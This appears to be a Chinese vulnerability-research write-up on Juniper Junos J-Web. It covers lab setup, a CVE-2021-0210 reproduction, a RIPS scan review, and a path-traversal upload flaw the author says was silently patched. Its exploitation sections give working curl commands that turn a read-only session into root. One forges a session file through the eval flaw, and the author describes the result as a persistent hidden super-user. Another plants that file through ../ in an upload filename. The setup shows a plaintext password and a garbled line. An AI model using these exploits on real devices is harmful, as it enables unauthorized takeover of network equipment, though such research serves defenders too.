0x01 juniper系统junos基本配置
=======================

```js

#进入junos模式  
cli  
​  
#进入配置模式  
configure  
​  
#设置root用户密码，下次登录的时候就需要输入你设置的密码了  
set  system  root-authentication  plain-text-password \[yourpassword\]  
#junos2022  
​  
#设置主机名  
set  system  host-name  Junos14.1R5.4  
​  
#设置接口IP地址，设置和虚拟网卡一个地址段  
set interface em1 unit 0 family inet address 192.168.77.100/24  
​  
#设置默认路由，默认路由就是你的vmware的地址  
set  routing-options  static  route  default  next-hop  192.168.77.1  retain no-readvertise  
​  
#开启snmp  
set snmp community public clients  192.168.77.99/32  
​  
#设置BGP开启  
set protocols bgp group ebgptest type external  
set protocols bgp group ebgptest local-address 192.168.77.99  
set protocols bgp group ebgptest neighbor 192.168.77.99 peer-as 65530  
set routing-options autonomous-system 65501  
set routing-options router-id 192.168.77.100  
​  
#开启telnet服务  
set  system  services  telnet  
#开启ssh服务  
set  system  services  ssh  
​  
#开启web管理界面  
set  system  services  web-management  http  port  80  
set system login user junos class super-user authentication plain-text-password  
wangzhaolin123456  
#开启https  
f'fffffffffffffffffffff'f'f'f'f'f'f'f'f'f'f'f'f'f'f'f'f'f'f  
commit提交  
​  
Linux#tar zxvf openssl-0.9.8i.tar.gz   
Linux#cd openssl-0.9.8i.tar.gz  
Linux#make  
Linux#make  install  
Linux#openssl req -x509 -nodes -newkey rsa:1024 -keyout https.pem -out https.pem  
Linux#cat https.pem  
#通过ftp的方式将刚才产生的证书https.pem上传到Junos的/var/tmp目录下：  
root@% cd /var/tmp/  
root@% ls  
现在我们就可以利用这个证书了：  
root# set security certificates local https load-key-file /var/tmp/https.pem   
#上面这条命令就是利用名为https.pem的文件在本地创建一个名为https的x.509证书，其中https.pem文件中包含SSL证书和私钥。  
root# commit   
commit complete
```

Show configuration查看到配置输入中包含web服务。

![image-20221005192020529.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-65f269ad2082a530ca9baef505b4733e5765dd9e.png)

访问web服务：

![image-20221005192050972.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-ff6f59602aea9acd10c9bdb4648aa1fab7331ab3.png)

0x02 复现cve-2021-0210
====================

1、漏洞简介
------

漏洞名称：CVE-2021-0210

漏洞功能：PHP任意代码执行，Web提权

前提条件：控制一个低权限用户，Juniper SRX开启J-web服务

适用版本：

12.3版本之前12.3 r12-s17  
17.3版本之前17.3 r3-s10  
17.4版本之前17.4 r2-s12 17.4 r3-s3  
18.1版本之前18.1 r3-s11  
18.2版本之前18.2 r3-s6  
18.3版本之前18.3 r2-s4 18.3 r3-s4  
18.4版本之前18.4 r2-s5 18.4 r3-s5  
19.1版本之前19.1 r1-s6 r2-s2 19.1, 19.1 r3-s3  
19.2版本之前19.2 r1-s5 19.2 r3, 19.2 r3-s1  
19.3版本之前19.3 r2-s4 19.3 r3  
19.4版本之前19.4 r1-s3 r2-s2 19.4, 19.4 r3  
20.1版本之前20.1 r1-s4 20.1 r2  
20.2版本之前20.2 r1-s1, 20.2 r2

漏洞点描述：漏洞点为eval函数输入过滤不严，可导致任意代码执行，主要存在于jail/html/modules/configuration/wizards/interfaces/widgets/wl.php以及其他几个拥有相似结构的php文件

补丁位置：utils.php中增加了一个新函数替代eval函数

2、漏洞简析
------

该漏洞点主要存在于wl.php以及其他几个拥有相似结构的php文件，如下图所示，漏洞利用的条件是首先有一个任意权限（可以是只读权限）的用户，获取其PHPSESSIONID以通过其is\_authenticated函数判断，获取其csrf\_token通过其client\_token\_validate判断，然后payload如下图所示，return是为了满足上述中return array的判断，pipinfo是eval的执行内容，curl -ksi通过post的方式进行报文的发送。

![image-20221005192158921.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-36476df0e540491d4ba1cf98806786fa8ee8b5b3.png)

POC如下：使用时需要注意更换PHPSESSID和CSRF\_tooken两个值，这两个值是低权限用户登陆后得到的，这是漏洞利用的前提条件。

```js
curl -ksi http://192.168.77.100/modules/configuration/wizards/interfaces/widgets/wl.php -b "PHPSESSID=5eed5d87f3c39664bc610e87e098135e4ebac2d2" --data "return array() || phpinfo();&key=undefined&csrf\_token=7eeeab8b391674941816853a9b70592b"
```

该POC在终端执行之后将返回的内容保存未一个html文件，然后用浏览器打开之后就可以得到phpinfo的界面。

![image-20221005193108833.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-039b763d0d2fda5feb4b42a881472729ea42a7e0.png)

3、漏洞利用
------

Junos用户登录身份铭牌存储于/var/sess/，文件名为SESSIONID值（可为任意值），文件内容包括了权限、有效时间、SESSIONID、csrf\_token等信息，可以通过命令生成一个该文件，文件名就是自己随意编写的sessionid值，内容参考原来的文件内容，并将权限由原来的read\_only更改为高权限root、把有效时间改为一个较大值实现持久化处理，以实现web提权的功能。

这样以添加隐藏超级用户的方式就实现了提权的功能，以及实现了持久化的处理。以后就可以通过修改浏览器的SESSIONID绕过登录认证以超级用户的权限登录。

如下图所示为身份铭牌文件的内容。

![image-20221005193810834.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-52c9ce7afe1a06e14125a5aaeea1f6e79cd2d5e8.png)

这里构造的EXP利用低权限的SESSIONID和csrf\_tocken进行漏洞利用，利用eval函数进行命令执行，这里的命令执行主要利用fwrite函数进行文件写入，以构造一个身份铭牌文件。

```js
curl -ksi http://192.168.122.10/modules/configuration/wizards/interfaces/widgets/wl.php -b "PHPSESSID=4a40de009c4d8b3cdee451629944b2f68efac0fc" --data "return array() || fwrite(fopen('/var/sess/sess\_4a40de009c4d8b3cdee451629944b2f68efac0f1',w),'language|s:7:\\"english\\";device-hostname|s:6:\\"NoName\\";device-model|s:4:\\"vsrx\\";lsysuser|s:0:\\"\\";tenantuser|s:0:\\"\\";super|s:5:\\"super\\";template-username|s:4:\\"root\\";username|s:4:\\"root\\";lsysname|s:0:\\"\\";tenantname|s:0:\\"\\";csrf\_key|s:0:\\"\\";csrf\_token|s:32:\\"e9f2e9aa5c876deb511b85af5bf740e1\\";debug-asp|s:8:\\"sp-0/0/0\\";debug-wizard-commit|b:1;jweb-authenticated|b:1;jweb-user-timeout|s:8:\\"99999999\\";jweb-last-access|i:1656837252;GLOBAL\_MODE|s:0:\\"\\";junos-version|N;isModelL2NG|b:1;jweb-commit-mode|s:12:\\"commit-check\\";TAP\_MODE|b:0;SKYATP\_ENABLED|b:0;report\_enabled|b:0;');&key=undefined&csrf\_token=5a5689a4cb4ce94d7c83db9fc04d9439"
```

运行EXP后，利用此身份信息，可以通过更换SESSIONID和cookie信息的方式实现web端高权限登录。

![image-20221005194422566.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-afa2026732824f5b1c39f2a6b503e34943f91062.png)

0x03 RIPS漏扫漏洞挖掘
===============

1、漏扫简单操作与分析
-----------

RIPS是一个用 PHP 编写的源代码分析工具，它使用了静态分析技术，能够自动化地挖掘 PHP 源代码潜在的安全漏洞。渗透测试人员可以直接容易的审阅分析结果，而不用审阅整个程序代码。RIPS 能够检测 XSS, SQL 注入, 文件泄露, Header Injection 漏洞等。

由于静态源代码分析的限制，RIPS是根据漏洞点代码特征或者是函数组合来判断漏洞是否真正存在，仍然需要代码审阅者确认。

其他的漏扫工具还包括一些动态的，通过设置登录信息对站点进行自动化的扫描，并进行动态的载荷攻击测试，比如可以通过xray和awvs进行漏扫。

对web服务下所有的php代码利用RIPS自动分析工具进行了自动化测试，共测试689个php文件，共搜索出689个可疑点。

![image-20221005194654268.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-0f277a5e069ca32d4062995cd2f5e27043aedef0.png)

为了判断漏洞点是否真实存在可用，接下来对部分的可以代码进行了分析，因为时间原因也没有对其全部分析。

在代码分析中发现有一处疑似xss漏洞，但是经过测试后发现，其对&lt;script&gt;进行了过滤，漏洞无法利用。

![wps9.jpg](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-f2863fc264612e147ebf439c6d7fa5ffd48f778c.jpg)

文件泄露可疑漏洞不可利用，分析源码是由于exit的存在，无法执行到下面的可以漏洞点，而且下面的\_SERVER由服务器指定，用户无法控制。

![wps10.jpg](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-1debaeb1d13e0d91e5f0da7fcdea90441c4aa05f.jpg)

工具中提示如下的代码中可能含有HTTP Response截断漏洞，但是基于HTTP Response的条件，hear中的参数必须要可控，但是这里都是对应的是文件大小无法利用，或者是文件名是根据SERVER(‘REQUEST\_URL’)获得，攻击者无法正常的控制其输入流，所以不存在漏洞。而且该漏洞是由于Apache服务器导致，与代码关系不大，在高版本中对于截断符已经做了处理，可利用性不大。

![wps12.jpg](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-81247ecd08c56524b45673df454891c24fcfd902.jpg)

Reflection Injection中从下方的requires中得到源码中已经做了过滤，所以此处的漏洞也难以利用。

![wps2.jpg](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-d1197334696d1eda00b4d5b9b78fd4ed6aac2fb9.jpg)

下面所示的可疑点参数是由REQUEST\_URI传入，可以尝试读取/var/tmp/下的文件，造成文件泄露漏洞，但是REQUEST\_URI是获取当前URL，而/var/tmp/并没有权限，所以这个漏洞也难以利用。

![wps3.jpg](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-86c238ebc2769e63c6d4406f117af04f4fbd69d2.jpg)

这里文件包含漏洞被制定了特定的文件夹下的文件有可能被包含，无法构造恶意文件，也就无法包含恶意文件。

![wps4.jpg](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-5a6b17d51c4373cbe6968e8a8165975d502d7c7b.jpg)

下面这个这个漏洞属于误报，由于这个测试的机制就是检测一些常见漏洞的函数组合，这里讲write和参数变量、password等信息的组合放在一起检查处可能存在漏洞，但是这里只是密码认证的一个步骤之一，不会造成文件覆写。因为pipes变量无法控制。

![wps5.jpg](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-69b9c559c88088164bf58a6d459d3884391de743.jpg)

2、可疑漏洞点测试-文件上传漏洞
----------------

从upload.php的源码上观察，看到可以任意权限的身份哪怕是只读的权限登录然后上传文件到指定的文件夹，这里是上传到vsr/tmp/，在绝大多数情况下，这个文件夹都没有执行的权限。需要在poc中以post的方式指定fileData、fileName、size等，size可以设置的比较大一些，同时这里必须要有一个任意权限的用户作为前提条件，因为和cve-2021-0210一样，这里需要csrf\_token的验证。

![image-20221005200307674.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-36ad1a8b594ce8fdc32acdf0e94cb6af3f02ad5b.png)

从上述源码上看，写入的文件内容会通过base64解密后在进行写入内容，所以在写入内容时，需要先把内容进行base64加密，这里有一个base64在线加解密的网站：<https://tool.oschina.net/encrypt?type=3>，然后对于文件名，如果post时不指定chunk内容，则它就会拼接路径为/var/tmp+filename，所以不用在exp中写入chunk。结合以上分析可以得处如下的poc，该poc计划写入的内容是一个网马。

![image-20221005200737768.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-8f44c6c8f417b7ca08aeec367c6ef57f64cedc75.png)

但是这里它将可以保存的位置仅仅局限于tmp文件夹，而这个文件夹一般具有的权限比较低，文件上传意义不大。  
这里为了绕过这个限制，可以采用通过../跳出固定文件夹设置，寻找可写文件/sess/（储存身份文件）上传身份铭牌文件以实现添加超级用户，或者在www文件夹下写入一个网马。

在19和20两个版本的junos系统中，通过如下的poc成功的实现了文件上传以及穿越，成功上传了特定身份文件到/sess/中，实现了用户权限提升。主要利用用户可控制文件名，可以构造../../+path+文件名的方式，跳出其对于只能上传到tmp文件夹下的限制，写到可写的sess文件夹下。Filedata是base64加密后的身份信息。

```js
curl -ksi http://192.168.122.10/upload.php -b "PHPSESSID=a3ff38bf0df03150d49ebcd3e1485c1921fbedec" --data "fileData=\\"bGFuZ3VhZ2V8czo3OiJlbmdsaXNoIjtkZXZpY2UtaG9zdG5hbWV8czo2OiJOb05hbWUiO2RldmljZS1tb2RlbHxzOjQ6InZzcngiO2xzeXN1c2VyfHM6MDoiIjt0ZW5hbnR1c2VyfHM6MDoiIjtzdXBlcnxzOjU6InN1cGVyIjt0ZW1wbGF0ZS11c2VybmFtZXxzOjQ6InJvb3QiO3VzZXJuYW1lfHM6NDoicm9vdCI7bHN5c25hbWV8czowOiIiO3RlbmFudG5hbWV8czowOiIiO2NzcmZfa2V5fHM6MDoiIjtjc3JmX3Rva2VufHM6MzI6ImU5ZjJlOWFhNWM4NzZkZWI1MTFiODVhZjViZjc0MGUxIjtkZWJ1Zy1hc3B8czo4OiJzcC0wLzAvMCI7ZGVidWctd2l6YXJkLWNvbW1pdHxiOjE7andlYi1hdXRoZW50aWNhdGVkfGI6MTtqd2ViLXVzZXItdGltZW91dHxzOjg6Ijk5OTk5OTk5Ijtqd2ViLWxhc3QtYWNjZXNzfGk6MTY1NjgzNzI1MjtHTE9CQUxfTU9ERXxzOjA6IiI7anVub3MtdmVyc2lvbnxOO2lzTW9kZWxMMk5HfGI6MTtqd2ViLWNvbW1pdC1tb2RlfHM6MTI6ImNvbW1pdC1jaGVjayI7VEFQX01PREV8YjowO1NLWUFUUF9FTkFCTEVEfGI6MDtyZXBvcnRfZW5hYmxlZHxiOjA7Cg==\\"&fileName=../sess/sess\_a3ff38bf0df03150d49ebcd3e1485c1921fbedc&csize=100&key=undefined&csrf\_token=05feb075baa3013358da7ff663acc717"
```

执行EXP后效果，

![image-20221005225148796.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-af4a14f5b54fdf8807d43f4369c33a8bc88a6c95.png)

查看最新版本的junos（22.1R1.10），发现这个地方被打了漏洞，说明这个地方虽然没有被爆出有漏洞，但是已经被厂商默默的打上了补丁。最新版本的junos对应的源码如下，这里会对filename进行测，也就是check\_filename函数。

![image-20221005225408919.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-c85520b01a2ae478f33982053c880ff6d6011392.png)

check\_filename函数当遇到../之类的东西时就会返回错误。

![image-20221005225506951.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-a4b733cfb3c0f440ce1172434857c7bd21b74ba0.png)